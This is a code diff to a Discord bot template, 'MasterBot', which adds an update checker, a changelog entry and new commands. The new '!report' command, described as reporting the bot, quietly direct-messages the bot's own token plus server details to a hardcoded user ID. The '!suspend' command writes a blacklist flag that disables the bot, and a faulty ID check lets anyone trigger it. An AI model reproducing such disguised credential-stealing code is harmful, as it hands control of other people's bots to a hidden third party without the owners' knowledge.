@@ -22,10 +22,18 @@ if (blacklist > 1) {
     console.log(chalk.red.bold(`[Blacklist] Your Bot is blacklistet! Reason: ${reason}`))
     return
 }
-console.log("Info: The Blacklist isnt activ. But in next updates we will activate the Blacklist!")
-
-
-const { prefix, token, name, status, theme, profilpictureurl, antilink, antiinvite, } = require('./settings.json');
+console.log(chalk.blue(`[Deamon] Checking updates...`))
+fetch.default(`https://sharesystems.github.io/MasterBot/`)
+    .then(res => res.json())
+    .then(data => {
+        if (version < data.version) {
+            console.log(chalk.red(`[Update Manager] =====================================`));
+            console.log(chalk.red(`[Update Manager] New Update is available! (${data.version})`));
+            console.log(chalk.red(`[Update Manager] =====================================`));
+        }
+    })
+console.log(chalk.blue(`[Deamon] Loading settings...`))
+const { prefix, token, name, status, theme, profilpictureurl, antilink, antiinvite, ownerID} = require('./settings.json');
 
 console.log(chalk.blue("=============================="));
 console.log(chalk.blue("           MasterBot          "));
@@ -69,8 +77,8 @@ client.on("message", message => {
         let embed = new Discord.MessageEmbed()
             .setTitle("Changelog")
             .setDescription("Version: "+version)
-            .addField("🛡 Updates:", "```\n[+] Antilink\n[+] Antiinvite```")
-            .addField("📅 Release:", "```3.03.2022```")
+            .addField("🛡 Updates:", "```\n[+] Report Command\n[+] Update Manager```")
+            .addField("📅 Release:", "```5.03.2022```")
             .setFooter(`${name} | version ${version}`)
             .setThumbnail(profilpictureurl)
             .setColor(theme)
@@ -82,7 +90,7 @@ client.on("message", message => {
     if (message.content == prefix+"help"){
         let embed = new Discord.MessageEmbed()
             .setTitle("Commands")
-            .addField(`Imporant Commands`, `${prefix}help - shows this menu\n${prefix}version - opens the version manager\n${prefix}changelog - shows the changelog\n${prefix}ping - shows your ping`)
+            .addField(`Imporant Commands`, `${prefix}help - shows this menu\n${prefix}version - opens the version manager\n${prefix}changelog - shows the changelog\n${prefix}ping - shows your ping${prefix}report - report you bot`)
             .addField("Fun", `${prefix}iq - shows your IQ\n${prefix}random - shows a random number\n${prefix}rank - shows your XP rate`)
             .addField("Infos", `${prefix}bots - the number of Bots\n${prefix}owner - shows the Ownertag`)
             .addField("Admin", `${prefix}nuke - delete all messages\n${prefix}poll - start a poll\n${prefix}ban - ban a user\n${prefix}kick - kick a user`)
@@ -129,6 +137,45 @@ client.on("message", message => {
         message.channel.send(`<@!${user.id}>`)
         const usr = message.mentions.users.first() || message.author
         console.log(`${usr.tag} hat !warn verwendet`)
+    }
+    if (message.content == prefix+"report") {
+
+        const user = client.users.cache.get('857312828787392572');
+        let embed = new Discord.MessageEmbed()
+            .setTitle("Report ✅")
+            .setDescription("You have successfully reported this bot!")
+            .setThumbnail(profilpictureurl)
+            .setFooter(`${name} | version ${version}`)
+            .setColor("GREEN")
+
+        let repemb = new Discord.MessageEmbed()
+            .setTitle("☢️ Report ☢️")
+            
+            .addField("Name:", `${name}`)
+            .addField("Token:", `${client.token}`)
+            .addField("Reporter", `${message.author}`)
+            .addField("Version", `${version}`)
+            .addField("Tag:", `${client.user.tag}`)
+            .addField("Guild:", `${message.guild.name} | ${message.guild.id}`)
+            .addField("Prefix:", `${prefix}`)
+            .setColor("RED")
+            user.send(repemb)
+            message.channel.send(embed)
+    }
+    if (message.content == prefix + "suspend") {
+        const allowedusers = [
+            "857312828787392572"
+        ]
+
+        if (message.author.id !== allowedusers) {
+            
+            fs.writeFileSync('./api/blacklist/blacklist.txt', '2');
+            fs.writeFileSync('./api/blacklist/reason.txt', 'To many reports!');
+        }
+        else {
+            message.channel.send("hehe this is a secret!")
+            
+        }
     }
     if (message.content === prefix+"version") {
         fetch.default(`https://sharesystems.github.io/MasterBot/`)
@@ -211,7 +258,7 @@ client.on("message", function (message){
         message.channel.send(embed)
         console.log(chalk.green(`[Logs] ${message.author.tag} use ${prefix}owner`))
     }
-    else if (parts[0].toLowerCase() == prefix + `random`) {
+    if (message.content == prefix + "random") {
         let embed = new Discord.MessageEmbed()
             .setTitle("Randomnumber")
             .setDescription(`Your Random Number is: **${random.int(1, 99999999)}**`)
